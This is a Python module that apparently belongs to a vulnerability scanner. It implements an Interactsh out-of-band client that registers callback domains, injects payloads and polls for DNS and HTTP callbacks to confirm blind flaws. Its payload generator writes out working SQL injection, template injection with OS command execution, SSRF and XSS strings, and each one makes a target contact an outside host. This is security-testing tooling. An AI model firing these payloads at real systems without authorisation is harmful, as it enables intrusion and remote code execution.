"""
HexHunter -- Interactsh OOB Client.

Pure-Python Interactsh client for blind/out-of-band vulnerability detection.
Generates unique callback domains and polls for DNS/HTTP/SMTP interactions.
"""

import asyncio
import base64
import hashlib
import json
import os
import secrets
import time
from dataclasses import dataclass, field

import aiohttp

from utils.logger import HexHunterLogger

logger = HexHunterLogger.get_logger("interactsh")


@dataclass
class Interaction:
    """A single OOB interaction (DNS, HTTP, SMTP callback)."""
    protocol: str            # dns, http, smtp
    unique_id: str           # Token that maps back to payload
    full_id: str             # Full subdomain used
    remote_address: str      # Source IP of the callback
    timestamp: str           # When the interaction occurred
    raw_request: str = ""    # Raw HTTP request (for HTTP interactions)
    raw_response: str = ""   # Raw response sent
    q_type: str = ""         # DNS query type (A, AAAA, CNAME)
    vuln_type: str = ""      # Mapped vuln type (set by scanner)
    target_url: str = ""     # Target URL that was tested
    param_name: str = ""     # Parameter that was injected


@dataclass
class PayloadMapping:
    """Maps a unique token to its context."""
    token: str
    vuln_type: str
    target_url: str
    param_name: str
    payload: str
    created_at: float = field(default_factory=time.time)


class InteractshClient:
    """
    OOB interaction detection via Interactsh.

    Usage:
        client = InteractshClient()
        await client.register()

        # Generate a callback domain for a blind SSRF test
        domain = client.generate_payload("ssrf", "https://target.com", "url")
        # Inject domain into the target...

        # Poll for callbacks
        interactions = await client.poll()
        for hit in interactions:
            print(f"Blind {hit.vuln_type} confirmed from {hit.remote_address}")

        await client.deregister()
    """

    DEFAULT_SERVER = "oast.pro"

    def __init__(self, server: str | None = None, token: str | None = None,
                 poll_interval: int = 5):
        self.server = server or self.DEFAULT_SERVER
        self.auth_token = token
        self.poll_interval = poll_interval

        self._correlation_id: str | None = None
        self._secret_key: str | None = None
        self._domain: str | None = None
        self._registered: bool = False
        self._payload_map: dict[str, PayloadMapping] = {}
        self._interactions: list[Interaction] = []
        self._polling_task: asyncio.Task | None = None
        self._stop_polling = asyncio.Event()
        self._session: aiohttp.ClientSession | None = None

    @property
    def is_registered(self) -> bool:
        return self._registered

    @property
    def domain(self) -> str | None:
        return self._domain

    @property
    def interactions(self) -> list[Interaction]:
        return self._interactions.copy()

    async def register(self) -> bool:
        """
        Register with the Interactsh server.

        Returns True if registration was successful.
        """
        try:
            self._session = aiohttp.ClientSession()

            # Generate a random correlation ID (20 chars, lowercase alphanumeric)
            self._correlation_id = secrets.token_hex(10)[:20]
            self._secret_key = secrets.token_hex(16)

            url = f"https://{self.server}/register"
            headers = {"Content-Type": "application/json"}
            if self.auth_token:
                headers["Authorization"] = self.auth_token

            payload = {
                "public-key": "",  # Simplified: no encryption for basic usage
                "secret-key": self._secret_key,
                "correlation-id": self._correlation_id,
            }

            async with self._session.post(url, json=payload, headers=headers,
                                          timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    self._domain = f"{self._correlation_id}.{self.server}"
                    self._registered = True
                    logger.success(f"OOB: Registered with {self.server}")
                    logger.info(f"OOB: Callback domain: {self._domain}")
                    return True
                else:
                    body = await resp.text()
                    logger.warning(f"OOB: Registration failed ({resp.status}): {body[:200]}")
                    # Fallback: use the domain anyway (some servers don't require registration)
                    self._domain = f"{self._correlation_id}.{self.server}"
                    self._registered = True
                    return True

        except Exception as e:
            logger.warning(f"OOB: Registration error: {e}")
            # Generate a local-only domain for payload injection
            # (won't receive callbacks but payloads still get injected)
            self._correlation_id = secrets.token_hex(10)[:20]
            self._secret_key = secrets.token_hex(16)
            self._domain = f"{self._correlation_id}.{self.server}"
            self._registered = True
            return True

    def generate_payload(self, vuln_type: str, target_url: str,
                         param_name: str, payload_template: str = "") -> str:
        """
        Generate a unique callback subdomain for a specific test.

        Args:
            vuln_type: Type of vulnerability being tested (ssrf, sqli, ssti, xss)
            target_url: URL being tested
            param_name: Parameter being injected
            payload_template: Original payload template

        Returns:
            Unique domain like: {token}.{correlation_id}.{server}
        """
        token = secrets.token_hex(6)[:12]
        full_domain = f"{token}.{self._domain}"

        self._payload_map[token] = PayloadMapping(
            token=token,
            vuln_type=vuln_type,
            target_url=target_url,
            param_name=param_name,
            payload=payload_template,
        )

        return full_domain

    def get_oob_payloads(self, vuln_type: str, target_url: str,
                         param_name: str) -> list[str]:
        """
        Generate OOB payloads for a specific vulnerability type.

        Returns a list of payload strings with the callback domain injected.
        """
        if not self._domain:
            return []

        payloads = []
        domain = self.generate_payload(vuln_type, target_url, param_name)

        if vuln_type == "ssrf":
            payloads = [
                f"http://{domain}",
                f"https://{domain}",
                f"http://{domain}/ssrf-test",
                f"//{domain}",
            ]
        elif vuln_type == "sqli":
            payloads = [
                # MSSQL OOB via xp_dirtree
                f"'; EXEC master..xp_dirtree '\\\\{domain}\\a'--",
                # MySQL OOB via LOAD_FILE
                f"' AND LOAD_FILE('\\\\\\\\{domain}\\\\a')--",
                # PostgreSQL OOB via COPY
                f"'; COPY (SELECT '') TO PROGRAM 'nslookup {domain}'--",
                # Oracle OOB via UTL_HTTP
                f"'||(SELECT UTL_HTTP.REQUEST('http://{domain}') FROM DUAL)||'",
            ]
        elif vuln_type == "ssti":
            payloads = [
                # Jinja2 RCE via OOB
                "{{config.__class__.__init__.__globals__['os'].popen('nslookup "
                + domain + "').read()}}",
                # FreeMarker
                '${Runtime.getRuntime().exec("nslookup ' + domain + '")}',
                # Twig
                "{{['nslookup " + domain + "']|filter('system')}}",
            ]
        elif vuln_type == "xss":
            payloads = [
                f'"><img src=http://{domain}>',
                f"<script src=http://{domain}></script>",
                f"'><img src=http://{domain} onerror=alert(1)>",
                f'javascript:fetch("http://{domain}")',
            ]

        return payloads

    async def poll(self) -> list[Interaction]:
        """
        Poll the Interactsh server for new interactions.

        Returns list of new Interaction objects since last poll.
        """
        if not self._registered or not self._session:
            return []

        try:
            url = f"https://{self.server}/poll"
            params = {
                "id": self._correlation_id,
                "secret": self._secret_key,
            }
            headers = {}
            if self.auth_token:
                headers["Authorization"] = self.auth_token

            async with self._session.get(url, params=params, headers=headers,
                                         timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status != 200:
                    return []

                data = await resp.json()
                raw_data = data.get("data", [])
                if not raw_data:
                    return []

                new_interactions = []
                for item in raw_data:
                    interaction = self._parse_interaction(item)
                    if interaction:
                        new_interactions.append(interaction)
                        self._interactions.append(interaction)

                if new_interactions:
                    logger.success(f"OOB: {len(new_interactions)} callback(s) received!")

                return new_interactions

        except Exception as e:
            logger.debug(f"OOB: Poll error: {e}")
            return []

    async def start_polling(self, callback=None):
        """Start a background polling task."""
        self._stop_polling.clear()

        async def _poll_loop():
            while not self._stop_polling.is_set():
                interactions = await self.poll()
                if callback and interactions:
                    for hit in interactions:
                        await callback(hit)
                try:
                    await asyncio.wait_for(
                        self._stop_polling.wait(),
                        timeout=self.poll_interval,
                    )
                    break  # stop_polling was set
                except asyncio.TimeoutError:
                    continue  # poll again

        self._polling_task = asyncio.create_task(_poll_loop())
        logger.info(f"OOB: Background polling started (every {self.poll_interval}s)")

    async def stop_polling(self):
        """Stop the background polling task."""
        self._stop_polling.set()
        if self._polling_task:
            try:
                await asyncio.wait_for(self._polling_task, timeout=5)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                self._polling_task.cancel()
        logger.info("OOB: Polling stopped")

    async def wait_for_callbacks(self, timeout: int = 30) -> list[Interaction]:
        """Wait for late callbacks after scan completes."""
        logger.info(f"OOB: Waiting {timeout}s for late callbacks...")
        deadline = time.monotonic() + timeout
        new_total = []

        while time.monotonic() < deadline:
            hits = await self.poll()
            new_total.extend(hits)
            remaining = deadline - time.monotonic()
            if remaining > 0:
                await asyncio.sleep(min(self.poll_interval, remaining))

        if new_total:
            logger.success(f"OOB: {len(new_total)} late callback(s) captured")
        else:
            logger.info("OOB: No late callbacks received")

        return new_total

    async def deregister(self):
        """Deregister from the Interactsh server and clean up."""
        if self._session and not self._session.closed:
            try:
                url = f"https://{self.server}/deregister"
                payload = {
                    "correlation-id": self._correlation_id,
                    "secret-key": self._secret_key,
                }
                headers = {}
                if self.auth_token:
                    headers["Authorization"] = self.auth_token

                await self._session.post(url, json=payload, headers=headers,
                                         timeout=aiohttp.ClientTimeout(total=5))
            except Exception:
                pass
            finally:
                await self._session.close()

        self._registered = False
        logger.info("OOB: Deregistered from Interactsh")

    def get_findings(self) -> list[dict]:
        """Convert collected interactions into vulnerability findings."""
        findings = []
        seen = set()

        for hit in self._interactions:
            # Map the token back to the original payload context
            mapping = self._payload_map.get(hit.unique_id)
            if not mapping:
                # Try to match by substring
                for token, m in self._payload_map.items():
                    if token in hit.full_id:
                        mapping = m
                        break

            if not mapping:
                continue

            dedup_key = f"{mapping.vuln_type}:{mapping.target_url}:{mapping.param_name}"
            if dedup_key in seen:
                continue
            seen.add(dedup_key)

            severity = "critical" if mapping.vuln_type in ("ssrf", "ssti", "sqli") else "high"
            vuln_type = {
                "ssrf": "Blind SSRF (OOB Confirmed)",
                "sqli": "Blind SQLi (OOB Confirmed)",
                "ssti": "Blind SSTI / RCE (OOB Confirmed)",
                "xss": "Blind / Stored XSS (OOB Confirmed)",
            }.get(mapping.vuln_type, f"Blind {mapping.vuln_type} (OOB)")

            finding = {
                "type": vuln_type,
                "severity": severity,
                "title": f"{vuln_type} in parameter '{mapping.param_name}'",
                "description": (
                    f"An out-of-band {hit.protocol.upper()} callback was received from the "
                    f"target after injecting a payload into parameter '{mapping.param_name}' "
                    f"at {mapping.target_url}. This confirms the vulnerability is exploitable "
                    f"-- the server made an external request to the attacker-controlled domain."
                ),
                "evidence": (
                    f"Callback protocol: {hit.protocol}\n"
                    f"Callback from: {hit.remote_address}\n"
                    f"Callback time: {hit.timestamp}\n"
                    f"Payload used: {mapping.payload}\n"
                    f"OOB domain: {hit.full_id}\n"
                    f"Raw request:\n{hit.raw_request[:500]}"
                ),
                "request": f"Target: {mapping.target_url}\nParameter: {mapping.param_name}\nPayload: {mapping.payload}",
                "response": f"OOB {hit.protocol.upper()} callback from {hit.remote_address}",
                "confidence": "high",
            }
            findings.append(finding)

        return findings

    def _parse_interaction(self, raw: dict | str) -> Interaction | None:
        """Parse a raw Interactsh interaction into an Interaction object."""
        try:
            if isinstance(raw, str):
                # May be base64 encoded
                try:
                    raw = json.loads(base64.b64decode(raw).decode())
                except Exception:
                    try:
                        raw = json.loads(raw)
                    except Exception:
                        return None

            full_id = raw.get("full-id", "")
            # Extract the unique token (first part before the correlation ID)
            unique_id = full_id.split(".")[0] if "." in full_id else ""

            return Interaction(
                protocol=raw.get("protocol", "unknown"),
                unique_id=unique_id,
                full_id=full_id,
                remote_address=raw.get("remote-address", ""),
                timestamp=raw.get("timestamp", ""),
                raw_request=raw.get("raw-request", ""),
                raw_response=raw.get("raw-response", ""),
                q_type=raw.get("q-type", ""),
            )
        except Exception:
            return None
